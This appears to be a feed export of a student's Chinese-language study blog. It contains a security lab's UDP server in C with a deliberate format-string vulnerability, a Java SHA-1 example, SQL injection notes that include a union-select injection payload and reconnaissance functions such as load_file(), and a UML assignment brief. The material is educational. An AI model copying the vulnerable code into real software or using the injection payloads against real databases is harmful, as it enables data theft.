class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 9090</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Changing this size will change the layout of the stack.</span></span><br><span class="line"><span class="comment"> * We have added 2 dummy arrays: in main() and myprintf().</span></span><br><span class="line"><span class="comment"> * Instructors can change this value each year, so students </span></span><br><span class="line"><span class="comment"> * won&#x27;t be able to use the solutions from the past.   </span></span><br><span class="line"><span class="comment"> * Suggested value: between 0 and 300  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> DUMMY_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DUMMY_SIZE 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *secret = <span class="string">&quot;A secret message\n&quot;</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  target = <span class="number">0x11223344</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">myprintf</span><span class="params">(<span class="type">char</span> *msg)</span> <span class="comment">// 漏洞存在函数 </span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uintptr_t</span> framep;</span><br><span class="line">    <span class="comment">// Copy the ebp value into framep, and print it out</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;movl %%ebp, %0&quot;</span> : <span class="string">&quot;=r&quot;</span>(framep));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The ebp value inside myprintf() is: 0x%.8x\n&quot;</span>, framep);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Change the size of the dummy array to randomize the parameters </span></span><br><span class="line"><span class="comment">       for this lab. Need to use the array at least once */</span></span><br><span class="line">    <span class="type">char</span> dummy[DUMMY_SIZE];  <span class="built_in">memset</span>(dummy, <span class="number">0</span>, DUMMY_SIZE); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// This line has a format-string vulnerability</span></span><br><span class="line">    <span class="built_in">printf</span>(msg);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The value of the &#x27;target&#x27; variable (after): 0x%.8x\n&quot;</span>, target);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This function provides some helpful information. It is meant to</span></span><br><span class="line"><span class="comment"> *   simplify the lab tasks. In practice, attackers need to figure</span></span><br><span class="line"><span class="comment"> *   out the information by themselves. */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">helper</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The address of the secret: 0x%.8x\n&quot;</span>, (<span class="type">unsigned</span>) secret);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The address of the &#x27;target&#x27; variable: 0x%.8x\n&quot;</span>, </span><br><span class="line">            (<span class="type">unsigned</span>) &amp;target); <span class="comment">// location address</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The value of the &#x27;target&#x27; variable (before): 0x%.8x\n&quot;</span>, target); <span class="comment">// value</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">client</span>;</span></span><br><span class="line">    <span class="type">int</span> clientLen;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">1500</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Change the size of the dummy array to randomize the parameters </span></span><br><span class="line"><span class="comment">       for this lab. Need to use the array at least once */</span></span><br><span class="line">    <span class="type">char</span> dummy[DUMMY_SIZE];  <span class="built_in">memset</span>(dummy, <span class="number">0</span>, DUMMY_SIZE); </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The address of the input array: 0x%.8x\n&quot;</span>, (<span class="type">unsigned</span>) buf);</span><br><span class="line">     </span><br><span class="line">    helper();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);</span><br><span class="line">    <span class="built_in">memset</span>((<span class="type">char</span> *) &amp;server, <span class="number">0</span>, <span class="keyword">sizeof</span>(server));</span><br><span class="line">    server.sin_family = AF_INET;</span><br><span class="line">    server.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line">    server.sin_port = htons(PORT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bind(sock, (<span class="keyword">struct</span> sockaddr *) &amp;server, <span class="keyword">sizeof</span>(server)) &lt; <span class="number">0</span>)</span><br><span class="line">        perror(<span class="string">&quot;ERROR on binding&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        bzero(buf, <span class="number">1500</span>);</span><br><span class="line">        recvfrom(sock, buf, <span class="number">1500</span><span class="number">-1</span>, <span class="number">0</span>,</span><br><span class="line">                 (<span class="keyword">struct</span> sockaddr *) &amp;client, &amp;clientLen);</span><br><span class="line">        myprintf(buf);</span><br><span class="line">    &#125;</span><br><span class="line">    close(sock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ol><li>头文件:</li></ol><ul><li>定义了一个名为 <code>PORT</code> 的宏，其值为9090，表示服务器将侦听的端口号。</li></ul><ol start="2"><li><strong>Secret</strong>和<strong>Target</strong>变量：</li></ol><ul><li>定义了一个字符指针 <code>secret</code>，并将其初始化为字符串 “A secret message\n” 的地址。</li><li>定义了一个无符号整数 <code>target</code> ，并将其初始化为值 <code>0x11223344</code>。</li></ul><ol start="3"><li><strong>myprintf</strong>函数:</li></ol><ul><li>myprintf函数接受一个名为msg的参数，预期为格式字符串。</li><li>声明了一个类型为 <code>uintptr_t</code> 的变量 <code>framep</code>，用于在函数内部使用内联汇编（asm）获取堆栈帧指针（EBP寄存器）的值。</li><li>声明了大小的虚拟数组dummy，并填充为零，以“随机化参数”。<br>代码使用了 <code>printf(msg)</code> 而没有进行适当的参数处理，可能会导致格式字符串漏洞。</li><li>在调用 <code>printf(msg)</code> 之前和之后都打印了 <code>target</code> 变量的值。</li></ul><ol start="4"><li><strong>main</strong>函数：</li></ol><ul><li>定义了服务器和客户端地址的结构、用于存储接收数据的 <code>缓冲区buf</code> 和一个 <code>clientLen</code> 变量。</li><li>再次使用 <code>dummy</code> 数组来“随机化参数”。</li><li>调用<code>helper</code>函数以打印 <code>secret</code> 和 <code>target</code> 变量的地址和值。</li><li>代码创建了一个UDP套接字，将其绑定到指定的端口，并进入循环以使用 <code>recvfrom</code> 和 <code>myprintf</code> 接收和处理传入的数据。</li><li>循环终止时关闭套接字。</li></ul><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202308150844257.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202308150844257.jpg" class="lazyload"></a></p><p>Q1) What are the memory addresses at the locations marked by 1, 2, and 3?</p><p>Q2) What is the distance between the locations marked by 1 and 3?</p><hr><h1 id="week5"><a href="#week5" class="headerlink" title="week5"></a>week5</h1><h2 id="Listing-1"><a href="#Listing-1" class="headerlink" title="Listing 1"></a>Listing 1</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.math.BigInteger; </span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets; </span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest; </span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Java program to calculate SHA-1 hash value </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MessageDigestTest</span> &#123; </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getSHA(String input) <span class="keyword">throws</span> NoSuchAlgorithmException </span><br><span class="line">&#123; </span><br><span class="line"><span class="comment">// Static getInstance method is called with hashing SHA-1</span></span><br><span class="line"><span class="type">MessageDigest</span> <span class="variable">md</span> <span class="operator">=</span> MessageDigest.getInstance(<span class="string">&quot;SHA-1&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// digest() method called </span></span><br><span class="line"><span class="comment">// to calculate message digest of an input </span></span><br><span class="line"><span class="comment">// and return array of byte </span></span><br><span class="line"><span class="keyword">return</span> md.digest(input.getBytes(StandardCharsets.UTF_8)); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">toHexString</span><span class="params">(<span class="type">byte</span>[] hash)</span> </span><br><span class="line">&#123; </span><br><span class="line"><span class="comment">// Convert byte array into signum representation </span></span><br><span class="line"><span class="type">BigInteger</span> <span class="variable">number</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="number">1</span>, hash); </span><br><span class="line"></span><br><span class="line"><span class="comment">// Convert message digest into hex value </span></span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">hexString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(number.toString(<span class="number">16</span>)); </span><br><span class="line"></span><br><span class="line"><span class="comment">// Pad with leading zeros </span></span><br><span class="line"><span class="keyword">while</span> (hexString.length() &lt; <span class="number">32</span>) </span><br><span class="line">&#123; </span><br><span class="line">hexString.insert(<span class="number">0</span>, <span class="string">&#x27;0&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> hexString.toString(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Driver code </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> </span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123; </span><br><span class="line">System.out.println(<span class="string">&quot;HashCode Generated by SHA-1 for:&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="string">&quot;FIT5003&quot;</span>; </span><br><span class="line">System.out.println(<span class="string">&quot;\n&quot;</span> + s1 + <span class="string">&quot; : &quot;</span> + toHexString(getSHA(s1))); </span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="string">&quot;hello world&quot;</span>; </span><br><span class="line">System.out.println(<span class="string">&quot;\n&quot;</span> + s2 + <span class="string">&quot; : &quot;</span> + toHexString(getSHA(s2))); </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// For specifying wrong message digest algorithms </span></span><br><span class="line"><span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123; </span><br><span class="line">System.out.println(<span class="string">&quot;Exception thrown for incorrect algorithm: &quot;</span> + e); </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div><p>Change the hash function from SHA1 to SHA256 and SHA512 (you need to change other variables in the program accordingly otherwise you may encounter errors).</p>]]></content>
    
    
    <summary type="html">寄 第一学期就结束了</summary>
    
    
    
    <category term="Monash笔记" scheme="https://manayakko.github.io/yakko117/categories/Monash%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Monash Cs" scheme="https://manayakko.github.io/yakko117/tags/Monash-Cs/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入学习笔记</title>
    <link href="https://manayakko.github.io/yakko117/2023/05/03/SQL_learning/"/>
    <id>https://manayakko.github.io/yakko117/2023/05/03/SQL_learning/</id>
    <published>2023-05-02T21:56:54.676Z</published>
    <updated>2023-05-19T05:16:54.503Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="Mysql的一些小trick"><a href="#Mysql的一些小trick" class="headerlink" title="Mysql的一些小trick"></a>Mysql的一些小trick</h1><p><code>SQL注入</code> 漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的 <code>数据</code> 拼接到 <code>SQL语句</code> 中后，被当作 <code>SQL语句</code> 的一部分执行。 从而导致数据库受损（被脱库、被删除、甚至整个服务器权限沦陷）。</p><p>一句话概括：注入产生的原因是接受的相关参数，未经过滤直接带入数据库查询操作。</p><p><code>SQL注入</code> 可以分为平台层注入和代码层注入。前者由不安全的数据库配置或数据库平台的漏洞所致；后者主要是由于程序员对输入未进行细致地过滤。<code>SQL注入</code> 是针对数据库、后台、系统层面的攻击！</p><ul><li>5.0以下是多用户单操作</li><li>5.0以上是多用户多操作</li></ul><p>在<strong>MySQL5.0以下</strong>，没有 <code>information_schema</code> 这个系统表，无法列表名等，只能暴力跑表名。</p><p>在<strong>MySQL5.0以上</strong>，MySQL中默认添加了一个名为 <code>information_schema</code> 的数据库，该数据库中的表都是<strong>只读的，不能进行更新、删除和插入等操作，也不能加载触发器</strong>，因为它们实际只是一个视图，不是基本表，没有关联的文件。</p><h2 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h2><ul><li><p>单行注释：#</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> #manayakko;</span><br></pre></td></tr></table></figure></div></li><li><p>多行注释：&#x2F;**&#x2F;</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="comment">/*manayakko*/</span>;</span><br></pre></td></tr></table></figure></div></li></ul><h2 id="information-schema数据库中三个很重要的表"><a href="#information-schema数据库中三个很重要的表" class="headerlink" title="information_schema数据库中三个很重要的表"></a>information_schema数据库中三个很重要的表</h2><ul><li><code>information_schema.schemata</code>: mysql库中的所有数据库的库名</li><li><code>information_schema.tables</code>： mysql库中的所有数据表的表名</li><li><code>information_schema.columns</code>: mysql库中的所有列的列名</li></ul><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure></div><p><code>LIMIT</code> 用于限制查询返回的结果数。</p><p>在 <code>SQL</code> 查询 <strong>SELECT schema_name FROM information_schema.schemata LIMIT 0, 1</strong> 的上下文<br><code>LIMIT</code> 指定仅应返回结果的第一行（即 <code>1</code> 行），从第一行开始（即 <code>0</code> 偏移量）</p><p>因此，此查询从 <code>information_schema</code> 数据库的 <code>schemata</code> 表中选择第一行结果，并返回 <code>schema_name</code> 列的值。<br>通过指定要返回的偏移量和行数，LIMIT 子句可用于返回特定范围的行</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LIMIT <span class="operator">&lt;</span><span class="keyword">offset</span><span class="operator">&gt;</span>, <span class="operator">&lt;</span>number <span class="keyword">of</span> <span class="keyword">rows</span><span class="operator">&gt;</span></span><br></pre></td></tr></table></figure></div><p>如果只指定一个值，则表示从结果集开头开始返回的行数（即 LIMIT <number of rows>）。</number></p><p><code>limit 0,1</code>：查询第1个数 <code>limit 5</code>：查询前5个<br><code>limit 1,1</code>： 查询第2个数<br><code>limit n,1</code>： 查询第n+1个数<br>也可以 <code>limit 1 offset 0</code></p><hr><h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><ul><li><code>version()</code>： 查询数据库的版本</li><li><code>user()</code>：查询数据库的使用者</li><li><code>database()</code>：数据库</li><li><code>system_user()</code>：系统用户名</li><li><code>session_user()</code>：连接数据库的用户名</li><li><code>current_user</code>：当前用户名</li><li><code>load_file()</code>：读取本地文件</li><li><code>@@datadir</code>：读取数据库路径</li><li><code>@@basedir</code>：mysql安装路径</li><li><code>@@version_compile_os</code>：查看操作系统</li></ul><p><code>ascii(str)</code>: 返回给定字符的ascii值，如果str是空字符串，返回0；<br>如果str是NULL，返回NULL。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ASCII(<span class="string">&#x27;A&#x27;</span>) <span class="keyword">AS</span> ascii_code;</span><br><span class="line"><span class="comment">-- This query will return the ASCII code for the character &#x27;A&#x27;, which is 65.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> mytable</span><br><span class="line"><span class="keyword">WHERE</span> ASCII(myfield) <span class="operator">=</span> <span class="number">65</span>;</span><br><span class="line"><span class="comment">-- This query will return all rows from mytable </span></span><br><span class="line"><span class="comment">-- where the value of myfield starts with the character &#x27;A&#x27;.</span></span><br></pre></td></tr></table></figure></div><p><code>length(str)</code>: 返回给定字符串的长度</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> LENGTH(<span class="string">&#x27;Hello, World!&#x27;</span>);</span><br><span class="line"><span class="comment">-- return 13</span></span><br></pre></td></tr></table></figure></div><p><code>substr(string,start,length)</code>: 对于给定字符串string，从start位开始截取，截取length长度 , </p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> substr(&quot;chinese&quot;,<span class="number">3</span>,<span class="number">2</span>)<span class="operator">=</span>&quot;in&quot;;</span><br><span class="line"><span class="comment">-- return 1</span></span><br></pre></td></tr></table></figure></div><p><code>substr()</code>、<code>stbstring()</code>、<code>mid()</code> 三个函数的用法、功能均一致</p><p><code>concat(username)</code>：将查询到的username连在一起，默认用逗号分隔</p><p><code>concat(str1,&#39;*&#39;,str2)</code>：将字符串str1和str2的数据查询到一起，中间用*连接</p><p><code>group_concat(username)</code>：将username数据查询在一起，用逗号连接</p><hr><h2 id="sql注入原理"><a href="#sql注入原理" class="headerlink" title="sql注入原理"></a>sql注入原理</h2><p>会涉及一个叫做<font color="red">预编译</font>的东西<br><a href="https://juejin.cn/post/6844903917654900743#heading-4">sql预编译</a><br><a href="https://www.cnblogs.com/Createsequence/p/16963891.html">预编译SQL为什么能够防止SQL注入</a><br><a href="https://www.nowcoder.com/issue/tutorial?zhuanlanId=zjbE7m">深入理解SQL注入与预编译</a></p><h1 id="Order-by-的一些事项"><a href="#Order-by-的一些事项" class="headerlink" title="Order by 的一些事项"></a>Order by 的一些事项</h1><p><a href="https://blog.csdn.net/qq_53079406/article/details/125815205">order by 注入：联合盲注、报错、堆叠注入</a><br><a href="https://yang1k.github.io/post/sql%E6%B3%A8%E5%85%A5%E4%B9%8Border-by%E6%B3%A8%E5%85%A5/">sql注入之order by注入</a><br><a href="https://www.secpulse.com/archives/57197.html">MySQL Order By 注入总结</a></p><p><strong>利用order by子句进行猜解表中的列数（修改后面的参数值），再配合union select语句进行回显</strong></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure></div><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202305191241731.jpg" data-fancybox="group" data-caption="orderby_1" class="fancybox"><img alt="orderby_1" title="orderby_1" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202305191241731.jpg" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">4</span>,<span class="string">&#x27;orderbytest&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="number">4</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span>;</span><br></pre></td></tr></table></figure></div><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202305191244140.jpg" data-fancybox="group" data-caption="orderby_2" class="fancybox"><img alt="orderby_2" title="orderby_2" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202305191244140.jpg" class="lazyload"></a></p><h2 id="if-盲注"><a href="#if-盲注" class="headerlink" title="if() 盲注"></a>if() 盲注</h2><p><a href="https://blog.csdn.net/weixin_44574152/article/details/118468813">if的sql盲注</a><br><a href="https://www.freebuf.com/articles/web/281559.html">SQL注入之盲注</a></p>]]></content>
    
    
    <summary type="html">有没有从代码层面了解过sql注入的成因</summary>
    
    
    
    <category term="学习笔记" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ctf" scheme="https://manayakko.github.io/yakko117/tags/ctf/"/>
    
    <category term="code audit" scheme="https://manayakko.github.io/yakko117/tags/code-audit/"/>
    
  </entry>
  
  <entry>
    <title>Use several UML analysis techniques to produce a report</title>
    <link href="https://manayakko.github.io/yakko117/2023/04/19/Modelling_report_analysis/"/>
    <id>https://manayakko.github.io/yakko117/2023/04/19/Modelling_report_analysis/</id>
    <published>2023-04-18T21:47:34.716Z</published>
    <updated>2023-04-20T07:37:10.808Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="叙述"><a href="#叙述" class="headerlink" title="叙述"></a>叙述</h1><p>基于对任务的理解，给出可能的解决方案，要包含对解决问题的范围，以及客户为解决方案需要提供的任何信息。 </p><h1 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h1><ol><li>use case digram 用例图 </li><li>use case description 用例描述 </li><li>Domain Class Diagram 领域类图 </li><li>Activity Diagram 活动图 </li><li>System Sequence Diagram 系统时序图</li></ol><h2 id="注册和个人简介"><a href="#注册和个人简介" class="headerlink" title="注册和个人简介"></a>注册和个人简介</h2><p>每个用户都需要注册，并创建个人简介。用户可以选择填写一些健康和人口统计信息，如年龄、性别、地点、体重和身高，并指定一些健身目标。 </p><p>Each user needs to register and create a personal profile. Users can choose to fill in some health and demographic information, such as age, gender, location, weight, and height, and specify some fitness goals. </p><h2 id="健康日记"><a href="#健康日记" class="headerlink" title="健康日记"></a>健康日记</h2><p>用户可以在健康日记中记录各种健身活动和测量结果，例如体重、腰围、血压、静息心率等。用户还可以添加基于文本的日记条目，并附加照片或视频。日记条目应该像其他社会媒体网站，如 Facebook 上的帖子。用户也应该能够对彼此的条目进行评论。 </p><p>Users can record various fitness activities and measurement results in their health diary, such as weight, waist circumference, blood pressure, resting heart rate, etc. Users can also add text based journal entries and attach photos or videos. Diary entries should resemble posts on other social media websites, such as Facebook. Users should also be able to comment on each other’s entries. </p><h2 id="手动输入和设备同步"><a href="#手动输入和设备同步" class="headerlink" title="手动输入和设备同步"></a>手动输入和设备同步</h2><p>用户可以手动添加一个条目到他们的日记。他们还应该能够编辑或删除他们所做的任何条目。此外，移动应用程序需要接受来自健身设备的数据，并在同步时自动为设备捕获的活动或测量创建日记条目。 </p><p>Users can manually add an entry to their diary. They should also be able to edit or delete any entries they make. In addition, mobile applications need to accept data from fitness devices and automatically create diary entries for activities or measurements captured by the device during synchronization. </p><h2 id="社交"><a href="#社交" class="headerlink" title="社交"></a>社交</h2><p>用户可以搜索其他用户并与之建立联系。连接请求需要得到接收请求的用户的批准。连接的用户将在他们的“订阅源”中看到彼此的“日记条目”，允许他们对这些条目发表评论。 